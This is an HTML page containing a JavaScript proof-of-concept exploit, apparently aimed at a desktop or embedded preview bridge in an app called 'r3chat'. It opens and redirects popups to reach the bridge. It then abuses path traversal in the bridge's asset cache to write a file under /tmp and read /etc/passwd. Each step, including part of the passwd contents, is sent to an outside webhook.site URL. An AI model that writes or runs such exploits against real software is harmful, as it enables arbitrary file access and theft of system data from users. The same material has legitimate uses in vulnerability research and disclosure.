<!doctype html>
<meta charset="utf-8">
<script>
const CALLBACK = "https://webhook.site/4a7dfec4-a41d-4177-8233-6489bfa07dbc";

async function log(data) {
  await fetch(CALLBACK + "?" + new URLSearchParams(data), { mode: "no-cors" });
}

(async () => {
  const b = window.rcPartner || window.previewBridge;
  if (!b) {
    if (!new URLSearchParams(location.search).has("stage2")) {
      const nonce = String(Date.now());
      const next = location.origin + location.pathname + "?stage2=1&nonce=" + nonce;
      const popup = window.open("https://www.google.com/?r3chat=" + nonce, "r3debug");
      await log({ stage: "dbg-open", popup: String(!!popup), next });

      setTimeout(async () => {
        try {
          popup.location.href = next + "&method=href";
          await log({ stage: "dbg-set-href" });
        } catch (e) {
          await log({ stage: "dbg-set-href-fail", err: String(e) });
        }
      }, 800);

      setTimeout(async () => {
        try {
          popup.location.replace(next + "&method=replace");
          await log({ stage: "dbg-replace" });
        } catch (e) {
          await log({ stage: "dbg-replace-fail", err: String(e) });
        }
      }, 1800);

      setTimeout(async () => {
        try {
          const p2 = window.open(next + "&method=open-existing", "r3debug");
          await log({ stage: "dbg-open-existing", popup: String(!!p2) });
        } catch (e) {
          await log({ stage: "dbg-open-existing-fail", err: String(e) });
        }
      }, 2800);
      return;
    }
    await log({ stage: "stage2-no-bridge", href: location.href });
    return;
  }

  await log({ stage: "bridge", caps: JSON.stringify(await b.capabilities()) });

  const key = "../../../../../../tmp/r3chat-poc";
  await b.assetCache.put(key, "r3chat arbitrary file write\n", "utf8");
  await log({ stage: "wrote", key });

  try {
    const passwd = await b.assetCache.get("../../../../../../etc/passwd", "utf8");
    await log({ stage: "read", sample: passwd.slice(0, 180) });
  } catch (e) {
    await log({ stage: "read-fail", err: String(e) });
  }
})().catch(e => log({ stage: "error", err: String(e && (e.stack || e)) }));
</script>
